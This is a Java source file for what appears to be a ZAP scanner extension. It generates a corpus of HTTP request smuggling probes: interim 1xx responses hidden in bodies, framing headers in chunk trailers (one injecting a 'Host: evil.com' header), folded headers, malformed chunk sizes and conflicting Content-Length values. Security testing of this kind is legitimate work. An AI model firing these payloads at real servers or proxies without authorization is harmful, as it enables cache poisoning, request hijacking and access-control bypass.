package org.zaproxy.zap.extension.hacktor.technique;

import java.util.List;
import java.util.function.BiConsumer;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import org.zaproxy.zap.extension.hacktor.VulnCatalog;

/**
 * The hand-authored desync corpus from PortSwigger's <em>http-terminator</em>
 * flamer stage ({@code flamer/import-parser-reuse.json} and
 * {@code flamer/import-x-trailing-space.json}), ported request for request.
 *
 * <p>These probes all rely on the same class of bug: a front end and an origin
 * sharing one HTTP parser, or one parser used for both directions, so a status
 * line, a trailer, a folded header or a chunk-size spelling is interpreted
 * differently by each. The upstream corpus is reproduced here with its
 * {@code $payload} placeholder filled in by a real smuggled request.
 *
 * <p>Groups, in the upstream order:
 * <ul>
 *   <li><b>1xx-skip</b> — an interim response placed in the body, relying on a
 *       parser that skips 1xx responses to resync onto the next request;</li>
 *   <li><b>trailer-inject</b> — framing headers smuggled into a chunked
 *       <i>trailer</i>, which some parsers honour and most strip;</li>
 *   <li><b>obs-fold</b> — a folded continuation line that some parsers treat as
 *       a new header and others as part of the previous value;</li>
 *   <li><b>conn-strip</b> — {@code Connection} naming a framing header, which
 *       RFC 7230 says must be removed before forwarding;</li>
 *   <li><b>chunk-syntax</b> — chunk sizes with extensions, {@code 0x} prefixes,
 *       leading zeros, or bare-LF terminators;</li>
 *   <li><b>CL-aberration</b> — conflicting, signed and over-spaced
 *       {@code Content-Length} values;</li>
 *   <li><b>header-fuzz</b> — a bare token header line with no colon.</li>
 * </ul>
 */
public class ParserReuseTechniqueBuilder extends DesyncTechniqueBuilder {

    @Override public String getFamily() { return "Parser Reuse"; }
    @Override public int getOrder() { return 69; }

    @Override public Technique.Position getPosition() { return Technique.Position.REQUEST; }


    private static final String FAMILY = "Parser Reuse";

    /**
     * Padding value for the {@code 1xxLongPad} probe. Upstream writes a
     * {@code ${very-long-string}} placeholder; a real 4 KB value is used so the
     * interim response's header block crosses the 4 KB and 8 KB header-buffer
     * limits that a front end may enforce while the origin has no such limit.
     */
    private static final String LONG_PAD = repeat('A', 4096);

    private static String repeat(char c, int n) {
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) {
            sb.append(c);
        }
        return sb.toString();
    }

    /**
     * label, description, method, headers (name,value; a null value removes the
     * header), body template, framing, trailing headers appended <em>after</em>
     * framing (so a duplicate Content-Length can coexist with the framed one).
     * Kept as a table so the corpus can be read against the upstream JSON without
     * translation loss.
     */
    private static final Object[][] CORPUS = {
        // ── 1xx-skip: an interim response line in the body ────────────────
        {"1xx100", "100 Continue in the body; a response parser may skip it and read the smuggled request as the next one",
            "POST", new String[][]{{"Content-Length", null}}, "HTTP/1.1 100 Continue\r\n\r\n$payload", Framing.CL, null},
        {"1xx103", "103 Early Hints in the body; 103 is resynced more permissively than 100 on several stacks",
            "POST", new String[][]{{"Content-Length", null}}, "HTTP/1.1 103 Early Hints\r\n\r\n$payload", Framing.CL, null},
        {"1xx102", "102 Processing in the body; a less common interim status in the 1xx-skip loop",
            "POST", new String[][]{{"Content-Length", null}}, "HTTP/1.1 102 Processing\r\n\r\n$payload", Framing.CL, null},
        {"1xxStacked", "stacked 1xx (100 then 103) - tests a multi-skip before the smuggled request is anchored",
            "POST", new String[][]{{"Content-Length", null}},
            "HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 103 Early Hints\r\n\r\n$payload", Framing.CL, null},
        {"1xxWithHeaders", "100 Continue with a non-empty header block - the skip must consume headers, not just the status line",
            "POST", new String[][]{{"Content-Length", null}},
            "HTTP/1.1 100 Continue\r\nX-Padding: value\r\n\r\n$payload", Framing.CL, null},
        {"1xxChunked", "100 Continue inside a chunked body",
            "POST", new String[][]{{"Content-Length", null}},
            "50\r\nHTTP/1.1 100 Continue\r\n\r\n$payload\r\n0\r\n\r\n", Framing.CHUNKED, null},
        {"1xxLongPad", "100 Continue padded with a very long header value - overflows the "
                + "header buffer of a front end that has already buffered the body, so it stops "
                + "reading at a different offset than the back end",
            "POST", new String[][]{{"Content-Length", null}},
            "HTTP/1.1 100 Continue\r\nX-Pad: " + LONG_PAD + "\r\n\r\n$payload", Framing.CL, null},
        // ── trailer-inject: framing headers hidden in a chunk trailer ──────
        {"TrailerTE", "chunked body whose trailer re-declares Transfer-Encoding: chunked",
            "POST", new String[][]{{"Content-Length", null}},
            "0\r\nTransfer-Encoding: chunked\r\n\r\n", Framing.CHUNKED, null},
        {"TrailerCL", "chunked body whose trailer declares a Content-Length the front end already used",
            "POST", new String[][]{{"Content-Length", null}},
            "0\r\nContent-Length: 50\r\n\r\n", Framing.CHUNKED, null},
        {"TrailerHeaders", "chunked body with a trailer carrying Host and an injected header",
            "POST", new String[][]{{"Content-Length", null}},
            "5\r\nhello\r\n0\r\nX-Injected: value\r\nHost: evil.com\r\n\r\n", Framing.CHUNKED, null},
        // ── EOF-framed and obs-fold ────────────────────────────────────────
        {"EOFFramed", "no framing header at all - the body runs to connection close",
            "POST", new String[][]{{"Content-Length", null}}, "$payload", Framing.EOF, null},
        {"FoldSimple", "obs-fold continuation line",
            "POST", new String[][]{{WIRE_HEADER_LINES, "X-Foo: bar\r\n baz"}}, null, Framing.EOF, null},
        {"FoldHideTE", "obs-fold continuation that carries the only Transfer-Encoding: chunked",
            "POST", new String[][]{{WIRE_HEADER_LINES, "X-Foo: bar\r\n\tTransfer-Encoding: chunked"},
                                   {"Transfer-Encoding", null}, {"Content-Length", null}},
            "", Framing.AS_DECLARED, null},
        {"FoldHideCL", "obs-fold continuation that carries a second Content-Length",
            "POST", new String[][]{{WIRE_HEADER_LINES, "X-Foo: bar\r\n Content-Length: 50"}},
            "$payload", Framing.AS_DECLARED, null},
        // ── conn-strip: Connection naming a framing header ─────────────────
        {"ConnStripTE", "Connection: Transfer-Encoding with both framing headers present",
            "POST", new String[][]{{"Connection", "Transfer-Encoding"}, {"Transfer-Encoding", "chunked"}},
            "hello", Framing.CL, null},
        {"ConnStripCL", "Connection: Content-Length with both framing headers present",
            "POST", new String[][]{{"Connection", "Content-Length"}, {"Content-Length", "5"},
                                   {"Transfer-Encoding", "chunked"}},
            "0\r\n\r\n", Framing.AS_DECLARED, null},
        // ── chunk-syntax: how the chunk size is spelled ────────────────────
        {"ChunkExt", "chunk size with a chunk extension ('5 ;ext=val')",
            "POST", new String[][]{{"Content-Length", null}},
            "5 ;ext=val\r\nhello\r\n0\r\n\r\n", Framing.CHUNKED, null},
        {"ChunkHexPrefix", "chunk size with a 0x prefix ('0x5')",
            "POST", new String[][]{{"Content-Length", null}},
            "0x5\r\nhello\r\n0\r\n\r\n", Framing.CHUNKED, null},
        {"ChunkLeadingZero", "chunk size with leading zeros ('005')",
            "POST", new String[][]{{"Content-Length", null}},
            "005\r\nhello\r\n0\r\n\r\n", Framing.CHUNKED, null},
        {"ChunkBareLF", "chunk data terminated with a bare LF instead of CRLF",
            "POST", new String[][]{{"Content-Length", null}},
            "5\nhello\r\n0\r\n\r\n", Framing.CHUNKED, null},
        // ── CL-aberration ──────────────────────────────────────────────────
        // Framing.AS_DECLARED throughout: the malformed value IS the probe, so it
        // must survive to the wire instead of being replaced by a computed length.
        {"CLDuplicate", "two conflicting Content-Length headers (5 then 100)",
            "POST", new String[][]{{"Content-Length", "5"}}, "hello$payload", Framing.AS_DECLARED,
            new String[][]{{"Content-Length", "100"}}},
        {"CLSigned", "Content-Length with an explicit plus sign ('+5')",
            "POST", new String[][]{{"Content-Length", "+5"}}, "hello", Framing.AS_DECLARED, null},
        {"CLExtraOWS", "Content-Length preceded by extra optional whitespace",
            "POST", new String[][]{{"Content-Length", "  5"}}, "hello", Framing.AS_DECLARED, null},
        // ── expect-1xx ─────────────────────────────────────────────────────
        {"Expect1xx", "Expect: 100-continue with a 1xx status line in the body",
            "POST", new String[][]{{"Expect", "100-continue"}, {"Content-Length", null}},
            "HTTP/1.1 100 Continue\r\n\r\n$payload", Framing.CL, null},
        // ── header-fuzz ────────────────────────────────────────────────────
        {"HeaderNoColon", "a bare token header line ('x ') with no colon at all",
            "GET", new String[][]{{WIRE_HEADER_LINES, "x "}}, "", Framing.EOF, null},
    };

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      PathContext ctx) {
        final String baseClean = ctx.baseClean;
        for (Object[] row : CORPUS) {
            final String label = (String) row[0];
            final String desc = (String) row[1];
            final String method = (String) row[2];
            @SuppressWarnings("unchecked")
            final String[][] headers = (String[][]) row[3];
            final String bodyTemplate = (String) row[4];
            final Framing framing = (Framing) row[5];
            @SuppressWarnings("unchecked")
            final String[][] trailing = (String[][]) row[6];
            final String body = bodyTemplate == null ? null : withSmuggled(bodyTemplate, baseClean);

            Technique tech = new Technique(FAMILY, "PR:" + label, desc,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    applyRaw(c, method, headers, body, framing);
                    if (trailing != null) {
                        for (String[] h : trailing) appendHeader(c, h[0], h[1]);
                    }
                    return c;
                });
            // obs-fold and header-name abuse are the classic ones; the rest are
            // parser-divergence corner cases.
            if (label.startsWith("Fold") || label.equals("HeaderNoColon")) {
                tech.setTier(VulnCatalog.Tier.CLASSIC);
            } else if (label.startsWith("1xx") || label.startsWith("CL")) {
                tech.setTier(VulnCatalog.Tier.CLASSIC);
            } else {
                tech.setTier(VulnCatalog.Tier.RARE);
            }
            tech.setDiscardOn(400, 404);
            tech.setDiscardEmptyBody(true);
            markRawAdd(techs, tech);
        }
    }
}
